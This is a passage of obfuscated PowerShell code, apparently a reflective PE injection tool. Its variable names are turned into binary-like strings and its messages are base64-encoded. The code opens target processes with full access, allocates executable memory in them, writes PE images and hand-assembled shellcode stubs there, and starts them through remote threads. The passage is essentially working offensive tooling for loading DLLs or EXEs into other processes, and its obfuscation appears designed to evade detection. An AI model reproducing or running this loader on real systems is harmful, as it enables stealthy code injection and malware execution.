            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZgBpAGwAZQAgAGQAbwBlAHMAbgAnAHQAIABzAHUAcABwAG8AcgB0ACAAQQBTAEwAUgAgAGIAdQB0ACAALQBGAG8AcgBjAGUAQQBTAEwAUgAgAGkAcwAgAHMAZQB0AC4AIABGAG8AcgBjAGkAbgBnACAAQQBTAEwAUgAgAG8AbgAgAHQAaABlACAAUABFACAAZgBpAGwAZQAuACAAVABoAGkAcwAgAGMAbwB1AGwAZAAgAHIAZQBzAHUAbAB0ACAAaQBuACAAYQAgAGMAcgBhAHMAaAAuAA==')))
        }
        if (${_01011101011011001} -and ${01100001000010111})
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AbgBvAHQAIAB1AHMAZQAgAEYAbwByAGMAZQBBAFMATABSACAAdwBoAGUAbgAgAGwAbwBhAGQAaQBuAGcAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4A'))) -ErrorAction Stop
        }
        if (${01100001000010111} -and (-not ${01110000001001000}))
        {
            Write-Error $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSAC4AIABDAGEAbgBuAG8AdAAgAGwAbwBhAGQAIABhACAAbgBvAG4ALQBBAFMATABSACAAUABFACAAaQBuACAAdABvACAAYQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwA='))) -ErrorAction Stop
        }
      ${_10101011101010101} = [IntPtr]::Zero				
      ${01010100101011000} = [IntPtr]::Zero		
      if (${01100001000010111} -eq $true)
      {
        ${_10101011101010101} = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]${_00001100001100000}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        ${01010100101011000} = $Win32Functions.VirtualAllocEx.Invoke(${_01000110101000100}, ${00100010010011000}, [UIntPtr]${_00001100001100000}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if (${01010100101011000} -eq [IntPtr]::Zero)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzAC4AIABJAGYAIAB0AGgAZQAgAFAARQAgAGIAZQBpAG4AZwAgAGwAbwBhAGQAZQBkACAAZABvAGUAcwBuACcAdAAgAHMAdQBwAHAAbwByAHQAIABBAFMATABSACwAIABpAHQAIABjAG8AdQBsAGQAIABiAGUAIAB0AGgAYQB0ACAAdABoAGUAIAByAGUAcQB1AGUAcwB0AGUAZAAgAGIAYQBzAGUAIABhAGQAZAByAGUAcwBzACAAbwBmACAAdABoAGUAIABQAEUAIABpAHMAIABhAGwAcgBlAGEAZAB5ACAAaQBuACAAdQBzAGUA')))
        }
      }
      else
      {
        if (${01101011111000011} -eq $true)
        {
          ${_10101011101010101} = $Win32Functions.VirtualAlloc.Invoke(${00100010010011000}, [UIntPtr]${_00001100001100000}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        }
        else
        {
          ${_10101011101010101} = $Win32Functions.VirtualAlloc.Invoke(${00100010010011000}, [UIntPtr]${_00001100001100000}.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        }
        ${01010100101011000} = ${_10101011101010101}
      }
      [IntPtr]${00000000001100010} = _01000001001001111 (${_10101011101010101}) ([Int64]${_00001100001100000}.SizeOfImage)
      if (${_10101011101010101} -eq [IntPtr]::Zero)
      { 
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBpAHIAdAB1AGEAbABBAGwAbABvAGMAIABmAGEAaQBsAGUAZAAgAHQAbwAgAGEAbABsAG8AYwBhAHQAZQAgAG0AZQBtAG8AcgB5ACAAZgBvAHIAIABQAEUALgAgAEkAZgAgAFAARQAgAGkAcwAgAG4AbwB0ACAAQQBTAEwAUgAgAGMAbwBtAHAAYQB0AGkAYgBsAGUALAAgAHQAcgB5ACAAcgB1AG4AbgBpAG4AZwAgAHQAaABlACAAcwBjAHIAaQBwAHQAIABpAG4AIABhACAAbgBlAHcAIABQAG8AdwBlAHIAUwBoAGUAbABsACAAcAByAG8AYwBlAHMAcwAgACgAdABoAGUAIABuAGUAdwAgAFAAbwB3AGUAcgBTAGgAZQBsAGwAIABwAHIAbwBjAGUAcwBzACAAdwBpAGwAbAAgAGgAYQB2AGUAIABhACAAZABpAGYAZgBlAHIAZQBuAHQAIABtAGUAbQBvAHIAeQAgAGwAYQB5AG8AdQB0ACwAIABzAG8AIAB0AGgAZQAgAGEAZABkAHIAZQBzAHMAIAB0AGgAZQAgAFAARQAgAHcAYQBuAHQAcwAgAG0AaQBnAGgAdAAgAGIAZQAgAGYAcgBlAGUAKQAuAA==')))
      }		
      [System.Runtime.InteropServices.Marshal]::Copy(${_00110111011010011}, 0, ${_10101011101010101}, ${_00001100001100000}.SizeOfHeaders) | Out-Null
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBlAHQAdABpAG4AZwAgAGQAZQB0AGEAaQBsAGUAZAAgAFAARQAgAGkAbgBmAG8AcgBtAGEAdABpAG8AbgAgAGYAcgBvAG0AIAB0AGgAZQAgAGgAZQBhAGQAZQByAHMAIABsAG8AYQBkAGUAZAAgAGkAbgAgAG0AZQBtAG8AcgB5AA==')))
      ${_00001100001100000} = _00010110110001110 -_10101011101010101 ${_10101011101010101} -Win32Types $Win32Types -Win32Constants $Win32Constants
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name EndAddress -Value ${00000000001100010}
      ${_00001100001100000} | Add-Member -MemberType NoteProperty -Name EffectivePEHandle -Value ${01010100101011000}
      Write-Verbose "StartAddress: $(_10110000010101001 ${_10101011101010101})    EndAddress: $(_10110000010101001 ${00000000001100010})"
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHAAeQAgAFAARQAgAHMAZQBjAHQAaQBvAG4AcwAgAGkAbgAgAHQAbwAgAG0AZQBtAG8AcgB5AA==')))
      _10001010010110001 -_00110111011010011 ${_00110111011010011} -_00001100001100000 ${_00001100001100000} -Win32Functions $Win32Functions -Win32Types $Win32Types
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGEAZABkAHIAZQBzAHMAZQBzACAAYgBhAHMAZQBkACAAbwBuACAAdwBoAGUAcgBlACAAdABoAGUAIABQAEUAIAB3AGEAcwAgAGEAYwB0AHUAYQBsAGwAeQAgAGwAbwBhAGQAZQBkACAAaQBuACAAbQBlAG0AbwByAHkA')))
      _01001100100011000 -_00001100001100000 ${_00001100001100000} -_01010111111011000 ${_01010111111011000} -Win32Constants $Win32Constants -Win32Types $Win32Types
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('SQBtAHAAbwByAHQAIABEAEwATAAnAHMAIABuAGUAZQBkAGUAZAAgAGIAeQAgAHQAaABlACAAUABFACAAdwBlACAAYQByAGUAIABsAG8AYQBkAGkAbgBnAA==')))
      if (${01100001000010111} -eq $true)
      {
        _10011110000000101 -_00001100001100000 ${_00001100001100000} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants -_01000110101000100 ${_01000110101000100}
      }
      else
      {
        _10011110000000101 -_00001100001100000 ${_00001100001100000} -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
      }
      if (${01100001000010111} -eq $false)
      {
        if (${01101011111000011} -eq $true)
        {
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBwAGQAYQB0AGUAIABtAGUAbQBvAHIAeQAgAHAAcgBvAHQAZQBjAHQAaQBvAG4AIABmAGwAYQBnAHMA')))
          _00001000000111011 -_00001100001100000 ${_00001100001100000} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -Win32Types $Win32Types
        }
        else
        {
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAcgBlAGYAbABlAGMAdABpAHYAZQBsAHkAIABsAG8AYQBkAGUAZAAgAGkAcwAgAG4AbwB0ACAAYwBvAG0AcABhAHQAaQBiAGwAZQAgAHcAaQB0AGgAIABOAFgAIABtAGUAbQBvAHIAeQAsACAAawBlAGUAcABpAG4AZwAgAG0AZQBtAG8AcgB5ACAAYQBzACAAcgBlAGEAZAAgAHcAcgBpAHQAZQAgAGUAeABlAGMAdQB0AGUA')))
        }
      }
      else
      {
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UABFACAAYgBlAGkAbgBnACAAbABvAGEAZABlAGQAIABpAG4AIAB0AG8AIABhACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACwAIABuAG8AdAAgAGEAZABqAHUAcwB0AGkAbgBnACAAbQBlAG0AbwByAHkAIABwAGUAcgBtAGkAcwBzAGkAbwBuAHMA')))
      }
      if (${01100001000010111} -eq $true)
      {
        [UInt32]${10001110110000010} = 0
        ${10111100011001010} = $Win32Functions.WriteProcessMemory.Invoke(${_01000110101000100}, ${01010100101011000}, ${_10101011101010101}, [UIntPtr](${_00001100001100000}.SizeOfImage), [Ref]${10001110110000010})
        if (${10111100011001010} -eq $false)
        {
          Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
        }
      }
      if (${_00001100001100000}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA'))))
      {
        if (${01100001000010111} -eq $false)
        {
          Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaABhAHMAIABiAGUAZQBuACAAbABvAGEAZABlAGQA')))
          ${01111111001001011} = _01000001001001111 (${_00001100001100000}.PEHandle) (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
          ${00000101101010010} = _00010110010100011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
          ${10001011010001000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01111111001001011}, ${00000101101010010})
          ${10001011010001000}.Invoke(${_00001100001100000}.PEHandle, 1, [IntPtr]::Zero) | Out-Null
        }
        else
        {
          ${01111111001001011} = _01000001001001111 (${01010100101011000}) (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
          if (${_00001100001100000}.PE64Bit -eq $true)
          {
            ${00000110110010101} = @(0x53, 0x48, 0x89, 0xe3, 0x66, 0x83, 0xe4, 0x00, 0x48, 0xb9)
            ${01111100001111110} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0x41, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x48, 0xb8)
            ${11000000100000111} = @(0xff, 0xd0, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
          }
          else
          {
            ${00000110110010101} = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xf0, 0xb9)
            ${01111100001111110} = @(0xba, 0x01, 0x00, 0x00, 0x00, 0xb8, 0x00, 0x00, 0x00, 0x00, 0x50, 0x52, 0x51, 0xb8)
            ${11000000100000111} = @(0xff, 0xd0, 0x89, 0xdc, 0x5b, 0xc3)
          }
          ${01010101100101101} = ${00000110110010101}.Length + ${01111100001111110}.Length + ${11000000100000111}.Length + (${11000010010100101} * 2)
          ${01001010101000110} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(${01010101100101101})
          ${00010101011110100} = ${01001010101000110}
          _01000001010000001 -_00101001000101111 ${00000110110010101} -_00000110000010110 ${01001010101000110}
          ${01001010101000110} = _01000001001001111 ${01001010101000110} (${00000110110010101}.Length)
          [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01010100101011000}, ${01001010101000110}, $false)
          ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
          _01000001010000001 -_00101001000101111 ${01111100001111110} -_00000110000010110 ${01001010101000110}
          ${01001010101000110} = _01000001001001111 ${01001010101000110} (${01111100001111110}.Length)
          [System.Runtime.InteropServices.Marshal]::StructureToPtr(${01111111001001011}, ${01001010101000110}, $false)
          ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000010010100101})
          _01000001010000001 -_00101001000101111 ${11000000100000111} -_00000110000010110 ${01001010101000110}
          ${01001010101000110} = _01000001001001111 ${01001010101000110} (${11000000100000111}.Length)
          ${10001111101001000} = $Win32Functions.VirtualAllocEx.Invoke(${_01000110101000100}, [IntPtr]::Zero, [UIntPtr][UInt64]${01010101100101101}, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
          if (${10001111101001000} -eq [IntPtr]::Zero)
          {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABhAGwAbABvAGMAYQB0AGUAIABtAGUAbQBvAHIAeQAgAGkAbgAgAHQAaABlACAAcgBlAG0AbwB0AGUAIABwAHIAbwBjAGUAcwBzACAAZgBvAHIAIABzAGgAZQBsAGwAYwBvAGQAZQA=')))
          }
          ${10111100011001010} = $Win32Functions.WriteProcessMemory.Invoke(${_01000110101000100}, ${10001111101001000}, ${00010101011110100}, [UIntPtr][UInt64]${01010101100101101}, [Ref]${10001110110000010})
          if ((${10111100011001010} -eq $false) -or ([UInt64]${10001110110000010} -ne [UInt64]${01010101100101101}))
          {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIAB3AHIAaQB0AGUAIABzAGgAZQBsAGwAYwBvAGQAZQAgAHQAbwAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAG0AZQBtAG8AcgB5AC4A')))
          }
          ${00110000110000000} = _00011001110011000 -_01000010000110000 ${_01000110101000100} -_01001010010000001 ${10001111101001000} -Win32Functions $Win32Functions
          ${10101110001001011} = $Win32Functions.WaitForSingleObject.Invoke(${00110000110000000}, 20000)
          if (${10101110001001011} -ne 0)
          {
            Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbAAgAHQAbwAgAEMAcgBlAGEAdABlAFIAZQBtAG8AdABlAFQAaAByAGUAYQBkACAAdABvACAAYwBhAGwAbAAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAgAGYAYQBpAGwAZQBkAC4A')))
          }
          $Win32Functions.VirtualFreeEx.Invoke(${_01000110101000100}, ${10001111101001000}, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
      }
      elseif (${_00001100001100000}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUA'))))
      {
        [IntPtr]${_01001011111001001} = [System.Runtime.InteropServices.Marshal]::AllocHGlobal(1)
        [System.Runtime.InteropServices.Marshal]::WriteByte(${_01001011111001001}, 0, 0x00)
        ${11000000101001000} = _00100010111101011 -_00001100001100000 ${_00001100001100000} -Win32Functions $Win32Functions -Win32Constants $Win32Constants -_01111001011011101 ${_00000011111101000} -_01001011111001001 ${_01001011111001001}
        [IntPtr]${00011011011011100} = _01000001001001111 (${_00001100001100000}.PEHandle) (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
        Write-Verbose "Call EXE Main function. Address: $(_10110000010101001 ${00011011011011100}). Creating thread for the EXE to run in."
        $Win32Functions.CreateThread.Invoke([IntPtr]::Zero, [IntPtr]::Zero, ${00011011011011100}, [IntPtr]::Zero, ([UInt32]0), [Ref]([UInt32]0)) | Out-Null
        while($true)
        {
          [Byte]${00101000001001101} = [System.Runtime.InteropServices.Marshal]::ReadByte(${_01001011111001001}, 0)
          if (${00101000001001101} -eq 1)
          {
            _00010100011100100 -_01011011100010110 ${11000000101001000} -Win32Functions $Win32Functions -Win32Constants $Win32Constants
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQBYAEUAIAB0AGgAcgBlAGEAZAAgAGgAYQBzACAAYwBvAG0AcABsAGUAdABlAGQALgA=')))
            break
          }
          else
          {
            sleep -Seconds 1
          }
        }
      }
      return @(${_00001100001100000}.PEHandle, ${01010100101011000})
    }
    Function _10010101111000100
    {
      Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        ${_10101011101010101}
      )
      $Win32Constants = _01001001010010001
      $Win32Functions = _00011011001110100
      $Win32Types = _10101011001010101
      ${_00001100001100000} = _00010110110001110 -_10101011101010101 ${_10101011101010101} -Win32Types $Win32Types -Win32Constants $Win32Constants
      if (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
      {
        [IntPtr]${00110001100000000} = _01000001001001111 ([Int64]${_00001100001100000}.PEHandle) ([Int64]${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
        while ($true)
        {
          ${00001011111010110} = [System.Runtime.InteropServices.Marshal]::PtrToStructure(${00110001100000000}, [Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR)
          if (${00001011111010110}.Characteristics -eq 0 `
            -and ${00001011111010110}.FirstThunk -eq 0 `
            -and ${00001011111010110}.ForwarderChain -eq 0 `
            -and ${00001011111010110}.Name -eq 0 `
            -and ${00001011111010110}.TimeDateStamp -eq 0)
          {
            Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABvAG4AZQAgAHUAbgBsAG8AYQBkAGkAbgBnACAAdABoAGUAIABsAGkAYgByAGEAcgBpAGUAcwAgAG4AZQBlAGQAZQBkACAAYgB5ACAAdABoAGUAIABQAEUA')))
            break
          }
          ${00010000000011101} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi((_01000001001001111 ([Int64]${_00001100001100000}.PEHandle) ([Int64]${00001011111010110}.Name)))
          ${01101011010100111} = $Win32Functions.GetModuleHandle.Invoke(${00010000000011101})
          if (${01101011010100111} -eq $null)
          {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RQByAHIAbwByACAAZwBlAHQAdABpAG4AZwAgAEQATABMACAAaABhAG4AZABsAGUAIABpAG4AIABNAGUAbQBvAHIAeQBGAHIAZQBlAEwAaQBiAHIAYQByAHkALAAgAEQATABMAE4AYQBtAGUAOgAgACQAewAwADAAMAAxADAAMAAwADAAMAAwADAAMAAxADEAMQAwADEAfQAuACAAQwBvAG4AdABpAG4AdQBpAG4AZwAgAGEAbgB5AHcAYQB5AHMA'))) -WarningAction Continue
          }
          ${10111100011001010} = $Win32Functions.FreeLibrary.Invoke(${01101011010100111})
          if (${10111100011001010} -eq $false)
          {
            Write-Warning $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABmAHIAZQBlACAAbABpAGIAcgBhAHIAeQA6ACAAJAB7ADAAMAAwADEAMAAwADAAMAAwADAAMAAwADEAMQAxADAAMQB9AC4AIABDAG8AbgB0AGkAbgB1AGkAbgBnACAAYQBuAHkAdwBhAHkAcwAuAA=='))) -WarningAction Continue
          }
          ${00110001100000000} = _01000001001001111 (${00110001100000000}) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
        }
      }
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGQAbABsAG0AYQBpAG4AIABzAG8AIAB0AGgAZQAgAEQATABMACAAawBuAG8AdwBzACAAaQB0ACAAaQBzACAAYgBlAGkAbgBnACAAdQBuAGwAbwBhAGQAZQBkAA==')))
      ${01111111001001011} = _01000001001001111 (${_00001100001100000}.PEHandle) (${_00001100001100000}.IMAGE_NT_HEADERS.OptionalHeader.AddressOfEntryPoint)
      ${00000101101010010} = _00010110010100011 @([IntPtr], [UInt32], [IntPtr]) ([Bool])
      ${10001011010001000} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${01111111001001011}, ${00000101101010010})
      ${10001011010001000}.Invoke(${_00001100001100000}.PEHandle, 0, [IntPtr]::Zero) | Out-Null
      ${10111100011001010} = $Win32Functions.VirtualFree.Invoke(${_10101011101010101}, [UInt64]0, $Win32Constants.MEM_RELEASE)
      if (${10111100011001010} -eq $false)
      {
        Write-Warning $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABjAGEAbABsACAAVgBpAHIAdAB1AGEAbABGAHIAZQBlACAAbwBuACAAdABoAGUAIABQAEUAJwBzACAAbQBlAG0AbwByAHkALgAgAEMAbwBuAHQAaQBuAHUAaQBuAGcAIABhAG4AeQB3AGEAeQBzAC4A'))) -WarningAction Continue
      }
    }
    Function _10101010110101110
    {
      $Win32Functions = _00011011001110100
      $Win32Types = _10101011001010101
      $Win32Constants =  _01001001010010001
      ${_01000110101000100} = [IntPtr]::Zero
      if ((${_00010011110000010} -ne $null) -and (${_00010011110000010} -ne 0) -and (${_01101111010001101} -ne $null) -and (${_01101111010001101} -ne ""))
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAcwB1AHAAcABsAHkAIABhACAAUAByAG8AYwBJAGQAIABhAG4AZAAgAFAAcgBvAGMATgBhAG0AZQAsACAAYwBoAG8AbwBzAGUAIABvAG4AZQAgAG8AcgAgAHQAaABlACAAbwB0AGgAZQByAA==')))
      }
      elseif (${_01101111010001101} -ne $null -and ${_01101111010001101} -ne "")
      {
        ${10111110001111010} = @(ps -Name ${_01101111010001101} -ErrorAction SilentlyContinue)
        if (${10111110001111010}.Count -eq 0)
        {
          Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAG4AJwB0ACAAZgBpAG4AZAAgAHAAcgBvAGMAZQBzAHMAIAAkAHsAXwAwADEAMQAwADEAMQAxADEAMAAxADAAMAAwADEAMQAwADEAfQA=')))
        }
        elseif (${10111110001111010}.Count -gt 1)
        {
          ${00010110000000001} = ps | where { $_.Name -eq ${_01101111010001101} } | select ProcessName, Id, SessionId
          echo ${00010110000000001}
          Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('TQBvAHIAZQAgAHQAaABhAG4AIABvAG4AZQAgAGkAbgBzAHQAYQBuAGMAZQAgAG8AZgAgACQAewBfADAAMQAxADAAMQAxADEAMQAwADEAMAAwADAAMQAxADAAMQB9ACAAZgBvAHUAbgBkACwAIABwAGwAZQBhAHMAZQAgAHMAcABlAGMAaQBmAHkAIAB0AGgAZQAgAHAAcgBvAGMAZQBzAHMAIABJAEQAIAB0AG8AIABpAG4AagBlAGMAdAAgAGkAbgAgAHQAbwAuAA==')))
        }
        else
        {
          ${_00010011110000010} = ${10111110001111010}[0].ID
        }
      }
      if ((${_00010011110000010} -ne $null) -and (${_00010011110000010} -ne 0))
      {
        ${_01000110101000100} = $Win32Functions.OpenProcess.Invoke(0x001F0FFF, $false, ${_00010011110000010})
        if (${_01000110101000100} -eq [IntPtr]::Zero)
        {
          Throw $ExecutionContext.InvokeCommand.ExpandString([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAbwBiAHQAYQBpAG4AIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIABwAHIAbwBjAGUAcwBzACAASQBEADoAIAAkAHsAXwAwADAAMAAxADAAMAAxADEAMQAxADAAMAAwADAAMAAxADAAfQA=')))
        }
        Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RwBvAHQAIAB0AGgAZQAgAGgAYQBuAGQAbABlACAAZgBvAHIAIAB0AGgAZQAgAHIAZQBtAG8AdABlACAAcAByAG8AYwBlAHMAcwAgAHQAbwAgAGkAbgBqAGUAYwB0ACAAaQBuACAAdABvAA==')))
      }
      Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAEkAbgB2AG8AawBlAC0ATQBlAG0AbwByAHkATABvAGEAZABMAGkAYgByAGEAcgB5AA==')))
      ${_10101011101010101} = [IntPtr]::Zero
      if (${_01000110101000100} -eq [IntPtr]::Zero)
      {
        ${00011110101001000} = _10100010011101110 -_00110111011010011 ${_00110111011010011} -_00000011111101000 ${_00000011111101000} -_01011101011011001 ${_01011101011011001}
      }
      else
      {
        ${00011110101001000} = _10100010011101110 -_00110111011010011 ${_00110111011010011} -_00000011111101000 ${_00000011111101000} -_01000110101000100 ${_01000110101000100} -_01011101011011001 ${_01011101011011001}
      }
      if (${00011110101001000} -eq [IntPtr]::Zero)
      {
        Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VQBuAGEAYgBsAGUAIAB0AG8AIABsAG8AYQBkACAAUABFACwAIABoAGEAbgBkAGwAZQAgAHIAZQB0AHUAcgBuAGUAZAAgAGkAcwAgAE4AVQBMAEwA')))
      }
      ${_10101011101010101} = ${00011110101001000}[0]
      ${00101100111100111} = ${00011110101001000}[1] 
      ${_00001100001100000} = _00010110110001110 -_10101011101010101 ${_10101011101010101} -Win32Types $Win32Types -Win32Constants $Win32Constants
      if ((${_00001100001100000}.FileType -ieq $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('RABMAEwA')))) -and (${_01000110101000100} -eq [IntPtr]::Zero))
      {
          switch (${_10100110010101100})
          {
              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwA='))) {
                  Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABXAFMAdAByAGkAbgBnACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
            [IntPtr]${10011100100000111} = _00111110101010000 -_10101011101010101 ${_10101011101010101} -_01100000000001000 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VwBTAHQAcgBpAG4AZwBGAHUAbgBjAA==')))
            if (${10011100100000111} -eq [IntPtr]::Zero)
            {
              Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
            }
            ${10111100100010010} = _00010110010100011 @() ([IntPtr])
            ${01001110011001101} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10011100100000111}, ${10111100100010010})
            [IntPtr]${01110000111010000} = ${01001110011001101}.Invoke()
            ${01100000010011000} = [System.Runtime.InteropServices.Marshal]::PtrToStringUni(${01110000111010000})
            echo ${01100000010011000}
              }
              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcA'))) {
                  Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABTAHQAcgBpAG4AZwAgAHIAZQB0AHUAcgBuACAAdAB5AHAAZQA=')))
            [IntPtr]${10000000110000001} = _00111110101010000 -_10101011101010101 ${_10101011101010101} -_01100000000001000 $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('UwB0AHIAaQBuAGcARgB1AG4AYwA=')))
            if (${10000000110000001} -eq [IntPtr]::Zero)
            {
              Throw $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBvAHUAbABkAG4AJwB0ACAAZgBpAG4AZAAgAGYAdQBuAGMAdABpAG8AbgAgAGEAZABkAHIAZQBzAHMALgA=')))
            }
            ${01010111001010100} = _00010110010100011 @() ([IntPtr])
            ${10000110001001011} = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(${10000000110000001}, ${01010111001010100})
            [IntPtr]${01110000111010000} = ${10000110001001011}.Invoke()
            ${01100000010011000} = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi(${01110000111010000})
            echo ${01100000010011000}
              }
              $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('VgBvAGkAZAA='))) {
                  Write-Verbose $([Text.Encoding]::Unicode.GetString([Convert]::FromBase64String('QwBhAGwAbABpAG4AZwAgAGYAdQBuAGMAdABpAG8AbgAgAHcAaQB0AGgAIABWAG8AaQBkACAAcgBlAHQAdQByAG4AIAB0AHkAcABlAA==')))
